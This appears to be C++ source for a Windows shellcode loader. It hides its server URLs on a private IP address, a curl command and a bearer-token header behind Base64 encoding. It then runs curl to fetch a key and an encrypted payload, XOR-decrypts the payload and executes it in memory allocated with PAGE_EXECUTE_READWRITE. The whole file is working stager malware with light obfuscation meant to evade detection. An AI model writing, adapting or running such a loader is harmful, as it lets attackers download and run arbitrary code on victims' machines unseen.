#include <windows.h>
#include <vector>
#include <string>
#include <sstream>

// XOR-based decryption function with single-byte key
void xorDecrypt(unsigned char* data, size_t size, unsigned char key) {
    for (size_t i = 0; i < size; ++i) {
        data[i] ^= key;
    }
}

// Function to execute shellcode
void executeShellcode(unsigned char* shellcode, size_t shellcodeSize) {
    void* exec = VirtualAlloc(0, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!exec) return;
    memcpy(exec, shellcode, shellcodeSize);
    ((void(*)())exec)();
}

// Function to run a command and capture the output
std::string runCommand(const std::string& command) {
    char buffer[128];
    std::stringstream result;
    FILE* pipe = _popen(command.c_str(), "r");
    if (!pipe) return "";
    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
        result << buffer;
    }
    _pclose(pipe);
    return result.str();
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Base64-encoded strings
    std::string keyUrlEncoded = "aHR0cHM6Ly8xOTIuMTY4LjEzNy4xNTY6ODQ0My9waXp6YS50eHQ=";
    std::string payloadUrlEncoded = "aHR0cHM6Ly8xOTIuMTY4LjEzNy4xNTY6ODQ0My9mdW4uYmlu";
    std::string curlBase = "Y3VybCAtayAtcyA=";
    std::string authHeaderBase = "QXV0aG9yaXphdGlvbjogQmVhcmVyIA==";

    // Base64 decoding logic
    auto base64Decode = [](const std::string& encoded) -> std::string {
        static const std::string base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        std::string decoded;
        std::vector<int> decoding_table(256, -1);
        for (int i = 0; i < 64; ++i) decoding_table[base64_chars[i]] = i;

        int val = 0, valb = -8;
        for (unsigned char c : encoded) {
            if (decoding_table[c] == -1) continue;
            val = (val << 6) + decoding_table[c];
            valb += 6;
            if (valb >= 0) {
                decoded.push_back(char((val >> valb) & 0xFF));
                valb -= 8;
            }
        }
        return decoded;
    };

    // Decode URLs and commands
    std::string keyUrl = base64Decode(keyUrlEncoded);
    std::string payloadUrl = base64Decode(payloadUrlEncoded);
    std::string curlBaseDecoded = base64Decode(curlBase);
    std::string authHeaderBaseDecoded = base64Decode(authHeaderBase);

    // Fetch decryption key
    std::string keyCommand = curlBaseDecoded + " " + keyUrl;
    std::string secretKeyStr = runCommand(keyCommand);
    while (!secretKeyStr.empty() && (secretKeyStr.back() == '\n' || secretKeyStr.back() == '\r' || secretKeyStr.back() == ' ')) {
        secretKeyStr.pop_back();
    }
    if (secretKeyStr.empty()) return 1;

    // Convert string key to single-byte numeric key
    unsigned char decryptionKey = static_cast<unsigned char>(std::stoi(secretKeyStr));

    /
    std::string payloadCommand = curlBaseDecoded + " -H \"" + authHeaderBaseDecoded + secretKeyStr + "\" " + payloadUrl;
    std::string payloadData = runCommand(payloadCommand);
    if (payloadData.empty()) return 1;

    std::vector<unsigned char> payload(payloadData.begin(), payloadData.end());

    
    xorDecrypt(payload.data(), payload.size(), decryptionKey);

   
    executeShellcode(payload.data(), payload.size());

    return 0;
}
